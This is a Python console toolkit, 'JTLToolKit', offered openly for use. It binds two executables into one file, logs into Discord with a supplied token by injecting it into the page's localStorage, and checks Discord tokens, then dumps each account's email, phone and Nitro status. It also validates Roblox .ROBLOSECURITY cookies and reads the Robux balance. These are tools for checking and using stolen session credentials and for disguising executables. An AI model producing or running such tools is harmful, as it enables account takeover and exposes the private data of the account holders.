import time
import os
import requests
import sys
from pystyle import Colors, Colorate , Write, Colors
from colorama import Fore
from selenium import webdriver
os.system(f'cls & mode 120,30 & title JTLToolKit')

def main():
    menu()

def menu():
        choices = Write.Input("""
             ▄█     ███      ▄█           ███      ▄██████▄   ▄██████▄   ▄█          ▄█   ▄█▄  ▄█      ███     
    ███ ▀█████████▄ ███       ▀█████████▄ ███    ███ ███    ███ ███         ███ ▄███▀ ███  ▀█████████▄ 
    ███    ▀███▀▀██ ███          ▀███▀▀██ ███    ███ ███    ███ ███         ███▐██▀   ███▌    ▀███▀▀██ 
    ███     ███   ▀ ███           ███   ▀ ███    ███ ███    ███ ███        ▄█████▀    ███▌     ███   ▀ 
    ███     ███     ███           ███     ███    ███ ███    ███ ███       ▀▀█████▄    ███▌     ███     
    ███     ███     ███           ███     ███    ███ ███    ███ ███         ███▐██▄   ███      ███     
    ███     ███     ███▌    ▄     ███     ███    ███ ███    ███ ███▌    ▄   ███ ▀███▄ ███      ███     
█▄ ▄███    ▄████▀   █████▄▄██    ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██   ███   ▀█▀ █▀      ▄████▀   
▀▀▀▀▀▀              ▀                                           ▀           ▀                          
                             Made By Jose#0001
                             [1] File Binder
                             [2] Discord Webhook Tool
                             [3] Discord Token Login 
                             [4] Discord Token Checker
                             [5] Discord Token Info
                             [6] Roblox Cookie Checker/Information
                             [7] Exit
                             Enter A Option -> """, Colors.blue_to_purple, interval=0.005)
        if choices == "1":
            file()
        elif choices == "2":
            tool()
        elif choices == "3":
            login()
        elif choices == "4":
             dchecker()
        elif choices == "5":
            dinfo()
        elif choices == "6":
            Rinfo()
        elif choices == "7":
            sys.exit
        else:
            print("Enter Right Choice")
            time.sleep(3)
            os.system('cls')
            menu()


def file():
    exe = Write.Input('Enter The 1st Exe You Wanna Bind ->', Colors.purple_to_blue, interval=0.01)
    with open(f"{exe}", "rb") as bind:
         file1 = bind.read()
    exes = Write.Input('Enter The 2nd Exe You Wanna Bind ->', Colors.purple_to_blue, interval=0.01)
    with open(f"{exes}", "rb") as bind:
         file2 = bind.read()
    output = Write.Input('Enter The Ouput Field Name ->', Colors.purple_to_blue, interval=0.01)
    with open(f"{output}", "wb") as merge:
         binded = file1 + file2
         merge.write(binded)
         Write.Print("File Binding Was Sucessfull", Colors.blue_to_green)
         time.sleep(2)
         os.system('cls')
         menu()


        


def login():
    token = Write.Input('Enter The Discord Token You Wanna Login Into ->', Colors.purple_to_blue, interval=0.01)
    driver = webdriver.Chrome('chromedriver.exe')
    driver.get('https://discord.com/login')
    script = """
        function login(token) {
        setInterval(() => {
        document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
        }, 50);
        setTimeout(() => {
        location.reload();
        }, 2500);
        }   44
        """
    driver.execute_script(script + f'login("{token}")')
    while True:
        os.system('cls')
        time.sleep(3)
        Write.Print(f"Token Logined Sucessfully" + token, Colors.blue_to_green,)
        time.sleep(3)
        os.system('cls')
        menu()

def tool():
    choice = Write.Input('1. Webhook Deleter Or 2. Webhook Checker ->', Colors.purple_to_blue, interval=0.01)
    if choice == "1":
        webhook = Write.Input('Enter The Webook You Wanna Delete->', Colors.blue_to_purple, interval=0.01)
        delete = requests.get(webhook)
        if delete.status_code == 404:
            Write.Print(f"Webhook Failed To Delete", Colors.blue_to_red)
            time.sleep(2)
            os.system('cls')
        else:
            requests.delete(webhook)
            Write.Print(f"Webhook Sucessfully Deleted", Colors.blue_to_green)
            time.sleep(3)
            os.system('cls')
            menu()
        
            
    elif choice == "2":
          webhook = Write.Input('Enter The Webook You Wanna Check->', Colors.blue_to_purple, interval=0.01)
          r = requests.get(webhook)
          if r.status_code == 200:
            Write.Print(f"Webhook Is Valid", Colors.blue_to_green)
            time.sleep(3)
            os.system('cls')
            menu()
          else:
             Write.Print(f"Webhook Is Invalid", Colors.blue_to_red)
             time.sleep(3)
             os.system('cls')
             menu()
        
    else:
         print("Enter Right Choice")
         time.sleep(3)
         os.system('cls')
         menu()






def dchecker():
    token = Write.Input('Enter Discord Token You Wanna Check ->', Colors.blue_to_purple, interval=0.01)
    headers = {'Content-Type': 'application/json', 'authorization': token}
    check = requests.get(f"https://discordapp.com/api/v9/users/@me", headers=headers)
    if check.status_code == 200:
        print(Colorate.Horizontal(Colors.blue_to_green, "Discord Token Is Valid",))
        time.sleep(2)
        os.system('cls')
        menu()
    else:
         print(Colorate.Horizontal(Colors.blue_to_red, "Discord Token Is Invalid",))
         time.sleep(2)
         os.system('cls')
         menu()

def dinfo():
    token = Write.Input('Enter The Discords Token->', Colors.purple_to_blue, interval=0.01)
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    check = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if check.status_code == 200:
        userName = check.json()['username']  + check.json()['discriminator']
        id = check.json()['id']
        phone = check.json()['phone']
        email = check.json()['email']
        avatar_id = check.json()['avatar']
        has_nitro = False
        checks = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=headers)
        nitro_data = checks.json()
        has_nitro = bool(len(nitro_data) > 0)
        print(f'''
        {Fore.YELLOW}Token:{Fore.RESET}{Fore.LIGHTCYAN_EX} {token} {Fore.RESET}
        {Fore.YELLOW}ID:{Fore.RESET}{Fore.LIGHTCYAN_EX} {id} {Fore.RESET}
        {Fore.YELLOW}Username:{Fore.RESET}{Fore.LIGHTCYAN_EX}{userName} {Fore.RESET}
        {Fore.YELLOW}Avatar-Id:{Fore.RESET}{Fore.LIGHTCYAN_EX}{avatar_id} {Fore.RESET}
        {Fore.YELLOW}Email:{Fore.RESET}{Fore.LIGHTCYAN_EX} {email}  {Fore.RESET}
        {Fore.YELLOW}Phone Number:{Fore.RESET}{Fore.LIGHTCYAN_EX}  {phone if phone else "No Phone Number Was Found On The Account"} {Fore.RESET}
        {Fore.YELLOW}Nitro:{Fore.RESET}{Fore.LIGHTCYAN_EX} {has_nitro if has_nitro else "The Account Dosent Have Nitro"} {Fore.RESET}
        press enter
            ''')
        input()
    else:
        Write.Print(f"Discord Token Is Invalid", Colors.blue_to_red,)
        time.sleep(2)
        os.system('cls')

        menu()
    exit = Write.Input('Would You Like To Exit y/n ->', Colors.blue_to_red)
    if exit == "y":
        sys.exit()
    elif exit == "n":
        os.system('cls')
        menu()


def Rinfo():
         cookie = Write.Input('Enter Roblox Cookie ->', Colors.blue_to_purple, interval=0.01)
         check = requests.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(cookie)})
         if check.status_code == 200:
             print(Colorate.Horizontal(Colors.blue_to_green, "Roblox Cookie Is Valid"))
             time.sleep(3)
             info = Write.Input('Would You Like To Get Info About This Roblox Cookie Y/N->', Colors.blue_to_purple, interval=0.01)
             if info == "Y":
                cookie = Write.Input('Enter Roblox Cookie ->', Colors.blue_to_purple, interval=0.01)
                check = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie}).json()
                print("Acount User Id: " +  str(check["UserID"]))
                print("Acount Username: " +  str(check["UserName"]))
                print("Robux Balance: " +  str(check["RobuxBalance"]))
                print("Premium: " +  str(check["IsPremium"]))
                print('Press Enter')
                exit = Write.Input('Would You Like To Exit y/n ->', Colors.blue_to_red)
                if exit == "y":
                     sys.exit()
                elif exit == "n":
                    os.system('cls')
                    menu()
             elif info == "N":
                os.system('cls')
                time.sleep(1)
                menu()
         else:
            print(Colorate.Horizontal(Colors.blue_to_red, "Roblox Cookie Is Invalid"))
            time.sleep(3)
            os.system('cls')
            menu()
            

menu()
